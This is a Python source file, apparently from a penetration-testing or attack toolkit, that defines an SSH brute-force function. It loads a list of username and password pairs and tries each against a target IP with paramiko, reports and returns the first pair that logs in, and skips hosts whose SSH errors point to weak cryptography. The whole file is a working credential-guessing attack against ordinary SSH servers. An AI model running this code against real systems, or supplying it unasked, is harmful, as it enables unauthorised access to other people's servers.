import paramiko
from bruteforce.credentials_loader import load_credentials

def ssh_bruteforce(ip, port=22):
    creds = load_credentials()

    GREEN = "\033[92m"
    RED = "\033[91m"
    YELLOW = "\033[93m"
    RESET = "\033[0m"

    print(f"{YELLOW}[*] Trying SSH brute-force on {ip}:{port}{RESET}")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for username, password in creds:
        try:
            client.connect(ip, port=port, username=username, password=password, timeout=3)
            print(f"{GREEN}[+] SSH login success: {username}:{password}{RESET}")
            client.close()
            return (username, password)

        except (paramiko.ssh_exception.SSHException, ValueError) as e:
            # Insecure crypto or broken SSH config
            insecure_keywords = ["DSA", "key size", "no matching key exchange", "p must be"]
            if any(k in str(e) for k in insecure_keywords):
                print(f"{YELLOW}[!] Insecure SSH service detected on {ip}:{port} — {str(e)}{RESET}")
                print(f"{RED}[-] Skipping brute-force due to insecure crypto configuration.{RESET}")
                return None
            continue

        except Exception:
            continue

    print(f"{RED}[-] No valid SSH credentials found.{RESET}")
    return None
